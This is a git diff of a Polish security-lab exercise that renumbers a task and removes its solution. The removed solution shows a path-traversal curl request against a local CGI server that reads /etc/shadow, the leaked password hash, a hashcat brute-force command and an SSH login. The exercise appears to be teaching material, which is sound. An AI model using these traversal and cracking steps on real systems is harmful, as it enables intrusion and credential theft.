@@ -104,47 +104,7 @@ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 agh:x:1000:1000:,,,:/home/agh:/bin/bash
 ```
 
-## **Zadanie 2**
+## **Zadanie 3**
 
 Serwer ma wystawiony również protokół SSH, twoim zadaniem jest zalogowanie się na użytkownika agh przez protokół ssh `ssh agh@localhost`. Wykorzystaj plik `etc/shadow` aby wyciągnąć hasło użytkownika agh.
 
-<details>
-<summary>Rozwązanie</summary>
-
-```console
- curl http://localhost:8090/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/shadow
-```
-
-wynik:
-
-```console
-...
-agh:$6$bDdeQMyxkE4l8q5s$iLIB.yf/lxCMGCAdx8yHiW9/av0JM.gCo5vy7aLpUG9Q/KWbD6m3BfxXFCKuyzFd1urcoGePMJ.pVKogH.sAw1:19364:0:99999:7:::
-```
-
-zapisujemy hash w pliku
-
-```
-echo '$6$bDdeQMyxkE4l8q5s$iLIB.yf/lxCMGCAdx8yHiW9/av0JM.gCo5vy7aLpUG9Q/KWbD6m3BfxXFCKuyzFd1urcoGePMJ.pVKogH.sAw1' > password
-```
-
-uruchamiamy hashcata
-
-```
-hashcat -m 1800 -a3 password ?u?u?u
-```
-
-Opcja "-m 1800" wskazuje na rodzaj szyfrowania hasła (rodzaj hashu), a w tym przypadku jest to rodzaj hashu SHA-512(Unix). Opcja "-a 3" oznacza, że hashcat będzie używał metody brute-force (przeprowadzenie próby złamania hasła poprzez wypróbowanie wszystkich możliwych kombinacji).
-
-password to plik w którym przechowujemy hash, który będzie przez nas łamany
-
-Jeśli chodzi o ciąg znaków "?u?u?u", to jest to szablon, który określa, jakie hasło będzie szukane [link](https://hashcat.net/wiki/doku.php?id=mask_attack).
-?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
-
-Po złamaniu hasła logujemy sie na serwer
-
-```
-ssh agh@localhost
-```
-
-</details>
